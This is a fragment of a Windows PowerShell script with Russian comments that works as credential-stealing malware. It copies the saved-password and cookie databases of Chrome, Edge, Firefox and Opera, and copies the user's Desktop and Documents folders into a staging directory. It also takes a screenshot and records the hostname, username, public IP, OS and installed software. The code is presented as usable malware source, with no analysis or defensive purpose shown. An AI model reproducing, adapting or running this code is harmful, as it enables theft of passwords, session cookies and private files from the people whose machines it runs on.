# 3. Сбор паролей и кук из браузеров (Chrome, Edge, Firefox, Opera, Brave)
function Get-BrowserData {
    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
        @{Name="Edge";   Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"},
        @{Name="Firefox";Path="$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release"},
        @{Name="Opera";  Path="$env:APPDATA\Opera Software\Opera Stable"}
    )
    foreach ($b in $browsers) {
        $dest = "$tmpDir\Browsers\$($b.Name)"
        New-Item -ItemType Directory -Force -Path $dest | Out-Null
        # Копируем файлы с паролями/куками (Логины, Куки, Веб-данные)
        $files = @("Login Data", "Cookies", "Web Data")
        if ($b.Path -like "*\*") {  # для Firefox копируем профили
            Copy-Item -Path "$($b.Path)\*" -Destination $dest -Recurse -ErrorAction SilentlyContinue
        } else {
            foreach ($f in $files) {
                $src = "$($b.Path)\$f"
                if (Test-Path $src) {
                    Copy-Item -Path $src -Destination "$dest\$f" -ErrorAction SilentlyContinue
                }
            }
        }
    }
}

# 4. Сбор всех файлов с рабочего стола и документов (можно настроить)
function Get-Files {
    $folders = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
    foreach ($folder in $folders) {
        $dest = "$tmpDir\Files\$(Split-Path $folder -Leaf)"
        New-Item -ItemType Directory -Force -Path $dest | Out-Null
        Copy-Item -Path "$folder\*" -Destination $dest -Recurse -ErrorAction SilentlyContinue
    }
}

# 5. Скриншот экрана
function Get-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $bitmap.Save("$tmpDir\screenshot.png")
    $graphics.Dispose()
    $bitmap.Dispose()
}

# 6. Сбор системной информации (логи, ключи реестра и т.д.)
function Get-SystemInfo {
    # Сохраняем вывод команд
    $info = @()
    $info += "Hostname: $env:COMPUTERNAME"
    $info += "Username: $env:USERNAME"
    $info += "IP: " + (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()
    $info += "OS: " + (Get-WmiObject Win32_OperatingSystem).Caption
    $info += "Installed Software: " + (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Format-Table -AutoSize | Out-String)
    $info | Out-File "$tmpDir\system_info.txt"
}

